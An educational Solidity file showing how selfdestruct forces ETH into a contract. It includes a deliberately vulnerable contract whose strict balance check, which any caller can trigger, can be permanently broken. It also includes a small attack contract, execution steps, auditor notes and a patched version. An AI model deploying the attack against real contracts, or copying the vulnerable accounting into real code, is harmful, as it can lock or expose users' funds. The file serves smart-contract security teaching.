// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: selfdestruct forces ETH into contract
CONCEPT: Forced balance behavior
=========================================================

OBJECTIVE

- Understand how selfdestruct can send ETH to any address
- Learn that ETH can be forced into contracts without payable functions
- Observe balance change without fallback/receive
- Learn historical + modern Ethereum behavior

=========================================================
CORE IDEA
=========================================================

selfdestruct(target) → sends ALL contract ETH to target

IMPORTANT:
No fallback() or receive() is required.

=========================================================
FORCED ETH CONTRACT (TARGET)
=========================================================
*/
contract VictimContractVul {

    uint256 public balanceTracker;

    function update() external payable {
        balanceTracker += msg.value;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /*
         Vulnerable

        Incorrectly assumes balanceTracker equals
        the actual ETH balance.
    */
    function withdrawAll() external {
        require(
            balanceTracker == address(this).balance,
            "Accounting mismatch"
        );

        payable(msg.sender).transfer(address(this).balance);

        balanceTracker = 0;
    }
}

/*
=========================================================
Attack Contract
=========================================================
*/

contract ForceEtherSenderVul {

    function forceSend(address payable target)
        external
        payable
    {
        selfdestruct(target);
    }
}

/*
=========================================================
EXECUTION FLOW
=========================================================

STEP 1:
Deploy VictimContract

STEP 2:
Deploy ForceEtherSender

STEP 3:
Call:

forceSend(VictimContract, 5 ether)

=========================================================

STEP-BY-STEP RESULT
=========================================================

1. ForceEtherSender holds 5 ETH
2. selfdestruct executed
3. ALL ETH transferred to VictimContract
4. ForceEtherSender is destroyed

=========================================================
IMPORTANT OBSERVATION
=========================================================

VictimContract receives ETH:

- WITHOUT calling receive()
- WITHOUT calling fallback()
- WITHOUT user interaction

=========================================================
STATE IMPACT

address(victim).balance increases

BUT:

balanceTracker DOES NOT update automatically

=========================================================
WHY THIS IS IMPORTANT

Contracts cannot block selfdestruct ETH transfers.

=========================================================
REAL SECURITY IMPLICATIONS

This behavior affects:

- DAO accounting systems
- invariant checks
- balance-based logic
- reward calculations

=========================================================
AUDITOR INSIGHT

Auditors check:

✔ Can contract receive ETH unexpectedly?
✔ Does logic rely on msg.value only?
✔ Are balance assumptions trusted?
✔ Are invariants based on address(this).balance?

=========================================================
MODERN NOTE (IMPORTANT)

In newer Ethereum upgrades:
- selfdestruct behavior is being restricted
- but legacy behavior still matters for audits

=========================================================
COMMON BUGS CAUSED

- stuck accounting mismatches
- reward inflation/deflation bugs
- incorrect total supply assumptions
- invariant breakage in DeFi protocols

=========================================================
KEY TAKEAWAYS

- selfdestruct bypasses receive/fallback
- ETH can be forced into any contract
- balance != accounting state
- protocols must not fully trust address.balance
- forced ETH breaks assumptions in DeFi systems

=========================================================
*/
// Patched code
contract VictimContract {

    mapping(address => uint256) public balances;
    uint256 public totalDeposits;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }

    function withdraw(uint256 amount) external {

        require(
            balances[msg.sender] >= amount,
            "Insufficient balance"
        );

        balances[msg.sender] -= amount;
        totalDeposits -= amount;

        (bool success, ) = payable(msg.sender).call{value: amount}("");

        require(success, "Transfer failed");
    }

    /*
        Internal accounting.

        Forced Ether does NOT affect this value.
    */
    function accountingBalance()
        external
        view
        returns (uint256)
    {
        return totalDeposits;
    }

    /*
        Actual ETH held by contract.

        May be larger because of forced Ether.
    */
    function actualBalance()
        external
        view
        returns (uint256)
    {
        return address(this).balance;
    }
}

/*
=========================================================
Educational Attack Contract
=========================================================
*/

contract ForceEtherSender {

    function forceSend(address payable target)
        external
        payable
    {
        selfdestruct(target);
    }
}